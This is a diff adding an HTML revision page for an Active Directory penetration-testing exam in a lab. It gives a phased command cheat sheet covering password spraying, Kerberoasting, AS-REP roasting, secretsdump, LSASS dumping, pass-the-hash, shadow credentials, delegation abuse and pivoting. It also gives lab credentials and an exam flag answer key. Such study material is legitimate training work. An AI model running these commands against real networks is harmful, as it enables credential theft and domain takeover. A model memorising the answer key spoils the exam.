@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Celestina AD Exam Revision</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header class="hero">
+    <div class="hero-content">
+      <p class="badge">Active Directory / Exegol / Flags Methodology</p>
+      <h1>Celestina Exam Revision</h1>
+      <p class="subtitle">
+        A complete step-by-step methodology to search, validate, and document exam flags.
+      </p>
+      <div class="hero-buttons">
+        <a href="#methodology">Start Methodology</a>
+        <a href="#commands" class="secondary">Command Cheat Sheet</a>
+      </div>
+    </div>
+  </header>
+
+  <nav class="navbar">
+    <a href="#overview">Overview</a>
+    <a href="#methodology">Methodology</a>
+    <a href="#flags">Flags Mapping</a>
+    <a href="#commands">Commands</a>
+    <a href="#troubleshooting">Troubleshooting</a>
+    <a href="#deploy">Deploy</a>
+  </nav>
+
+  <main>
+    <section id="overview" class="card">
+      <h2>1. Exam Objective</h2>
+      <p>
+        The goal of the exam is to identify weaknesses in the Active Directory infrastructure,
+        exploit them in the authorized lab, and recover flags as proof of impact.
+      </p>
+      <div class="chain">
+        <span>Enumerate</span>
+        <span>Analyze</span>
+        <span>Exploit</span>
+        <span>Escalate</span>
+        <span>Pivot</span>
+        <span>Repeat</span>
+      </div>
+    </section>
+
+    <section id="methodology" class="card">
+      <h2>2. Full Methodology</h2>
+
+      <article>
+        <h3>Phase 0 — Preparation</h3>
+        <pre><code>export DC_IP=10.13.37.42
+export DOMAIN=celestina.shop
+export SUBNET=10.13.37.0/24
+export SUBNET_HIDDEN=10.37.13.0/24
+export USER=pentester
+export PASS='Password123!'
+export DEFAULT_PASS='C3L3stin4!Us3r'
+cd /workspace</code></pre>
+
+        <pre><code>echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" >> /etc/hosts
+echo "nameserver 10.13.37.42" > /etc/resolv.conf
+nslookup dc-celestina.celestina.shop</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 1 — Reconnaissance</h3>
+        <pre><code>nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!'
+nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --shares
+nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' --shares</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 2 — Shares and Default Password</h3>
+        <pre><code>nxc smb 10.13.37.123 -u 'pentester' -p 'Password123!' -M spider_plus --share HUB
+smbclient //10.13.37.123/HUB -U 'pentester%Password123!' -c 'get notice.pdf'
+strings notice.pdf | grep -i -E 'password|default|flag|C3L'</code></pre>
+        <p class="note">Expected training password: <strong>C3L3stin4!Us3r</strong></p>
+      </article>
+
+      <article>
+        <h3>Phase 3 — User Enumeration</h3>
+        <pre><code>nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --rid-brute 2&gt;/dev/null | grep SidTypeUser | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u &gt; users.txt
+cat users.txt</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 4 — BloodHound CLI</h3>
+        <pre><code>bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All</code></pre>
+
+        <pre><code>grep -i '"description"' *users*.json | grep -v '""'
+grep -i "AddKeyCredentialLink" *.json
+grep -i "allowedtodelegate\|trustedfordelegation" *.json
+grep -i "GenericAll\|GenericWrite" *.json</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 5 — Password Spray</h3>
+        <pre><code>nxc smb 10.13.37.0/24 -u users.txt -p 'C3L3stin4!Us3r' --continue-on-success</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 6 — Kerberos Attacks</h3>
+        <h4>AS-REP Roasting</h4>
+        <pre><code>GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42 -outputfile asrep.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
+hashcat -m 18200 asrep.txt --show</code></pre>
+
+        <h4>Kerberoasting</h4>
+        <pre><code>GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42 -outputfile kerb.txt
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 kerb.txt --show</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 7 — Validate Credentials</h3>
+        <pre><code>nxc smb 10.13.37.0/24 -u 'USER' -p 'PASS' --continue-on-success</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 8 — secretsdump and Pass-the-Hash</h3>
+        <pre><code>secretsdump.py celestina.shop/a.nozer:'C3L3stin4!Us3r'@10.13.37.123
+nxc smb 10.13.37.0/24 -u Administrator -H 'HASH' --local-auth</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 9 — LSASS and Pass-the-Ticket</h3>
+        <pre><code>nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy
+ls -lh /root/.nxc/modules/lsassy/</code></pre>
+
+        <pre><code>export KRB5CCNAME="/path/to/ticket.ccache"
+klist
+nxc smb targets.txt -u 'USER' -k -d celestina.shop --use-kcache</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 10 — Shadow Credentials</h3>
+        <pre><code>certipy-ad shadow auto -u a.nozer@celestina.shop -p 'C3L3stin4!Us3r' -account k.cheh -target dc-celestina.celestina.shop
+nxc smb 10.13.37.0/24 -u 'k.cheh' -H 'HASH'</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 11 — Delegation Abuse</h3>
+        <pre><code>getST.py -dc-ip 10.13.37.42 -spn HTTP/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:PASSWORD'
+export KRB5CCNAME="$(pwd)/Administrator.ccache"
+nxc smb WK-155.celestina.shop -u Administrator -k --use-kcache -x 'whoami'</code></pre>
+      </article>
+
+      <article>
+        <h3>Phase 12 — Hidden Network Pivot</h3>
+        <pre><code>nxc smb 10.13.37.0/24 -u Administrator -H 'HASH' --local-auth -x 'ipconfig' 2&gt;&1 | grep -B8 '10.37.13'
+nxc smb 10.37.13.0/24 -u 'USER' -p 'PASS' --continue-on-success</code></pre>
+      </article>
+    </section>
+
+    <section id="flags" class="card">
+      <h2>3. Flags Mapping</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Challenge</th>
+            <th>Technique</th>
+            <th>Main Command</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Le goût par défaut</td><td>Default password in notice.pdf</td><td>strings notice.pdf</td></tr>
+          <tr><td>Décrivez précisément</td><td>LDAP description leak</td><td>grep description users.json</td></tr>
+          <tr><td>Secret trop partagé</td><td>SYSVOL / GPP</td><td>nxc -M gpp_password</td></tr>
+          <tr><td>Un café vraiment pas sécurisé</td><td>AS-REP Roasting</td><td>GetNPUsers.py</td></tr>
+          <tr><td>CAAS ou Café as a service</td><td>Kerberoasting</td><td>GetUserSPNs.py</td></tr>
+          <tr><td>Passe moi le hash</td><td>Pass-the-Hash</td><td>nxc -H HASH --local-auth</td></tr>
+          <tr><td>Caché dans le secret LSA</td><td>LSASS dump</td><td>nxc -M lsassy</td></tr>
+          <tr><td>RDP non-nécessaire</td><td>Excessive RDP rights</td><td>nxc rdp subnet</td></tr>
+          <tr><td>Je vis dans l'ombre</td><td>Shadow Credentials</td><td>certipy-ad shadow auto</td></tr>
+          <tr><td>Libéré, délivré</td><td>Delegation abuse</td><td>getST.py</td></tr>
+          <tr><td>Promener le chien</td><td>BloodHound</td><td>bloodhound-python -c All</td></tr>
+          <tr><td>Protocole KRB</td><td>Pass-the-Ticket</td><td>export KRB5CCNAME</td></tr>
+          <tr><td>Réseau non accessible</td><td>Pivot hidden subnet</td><td>ipconfig + 10.37.13.0/24 scan</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section id="commands" class="card">
+      <h2>4. Command Cheat Sheet</h2>
+      <div class="grid">
+        <div>
+          <h3>SMB</h3>
+          <pre><code>nxc smb 10.13.37.0/24 -u USER -p PASS</code></pre>
+        </div>
+        <div>
+          <h3>RDP</h3>
+          <pre><code>nxc rdp 10.13.37.0/24 -u USER -p PASS</code></pre>
+        </div>
+        <div>
+          <h3>AS-REP</h3>
+          <pre><code>hashcat -m 18200 asrep.txt rockyou.txt</code></pre>
+        </div>
+        <div>
+          <h3>Kerberoast</h3>
+          <pre><code>hashcat -m 13100 kerb.txt rockyou.txt</code></pre>
+        </div>
+        <div>
+          <h3>PTH</h3>
+          <pre><code>nxc smb HOST -u Administrator -H HASH --local-auth</code></pre>
+        </div>
+        <div>
+          <h3>Ticket</h3>
+          <pre><code>export KRB5CCNAME=ticket.ccache
+klist</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <section id="troubleshooting" class="card">
+      <h2>5. Troubleshooting</h2>
+      <ul>
+        <li><strong>Kerberos fails:</strong> fix DNS and use FQDN, not IP.</li>
+        <li><strong>Hashcat rockyou missing:</strong> search with <code>find / -name rockyou.txt* 2&gt;/dev/null</code>.</li>
+        <li><strong>nxc -k fails:</strong> use <code>--use-kcache</code> and target FQDN.</li>
+        <li><strong>lsassy blocked:</strong> try another host where you have admin rights.</li>
+        <li><strong>No admin found:</strong> return to BloodHound, descriptions, Kerberos, SYSVOL, and spraying.</li>
+      </ul>
+    </section>
+
+    <section id="deploy" class="card">
+      <h2>6. Deployment</h2>
+      <h3>Option A — Open Locally</h3>
+      <p>Double-click <code>index.html</code>.</p>
+
+      <h3>Option B — Run with Python</h3>
+      <pre><code>cd celestina_exam_html_project
+python3 -m http.server 8080</code></pre>
+      <p>Open: <code>http://localhost:8080</code></p>
+
+      <h3>Option C — Deploy on GitHub Pages</h3>
+      <pre><code>git init
+git add .
+git commit -m "Celestina exam revision website"
+git branch -M main
+git remote add origin https://github.com/YOUR_USERNAME/celestina-exam-revision.git
+git push -u origin main</code></pre>
+      <p>Then go to GitHub → Settings → Pages → Deploy from branch → main → root.</p>
+    </section>
+  </main>
+
+  <footer>
+    <p>Celestina AD Exam Revision — Built for fast exam preparation.</p>
+  </footer>
+</body>
+</html>
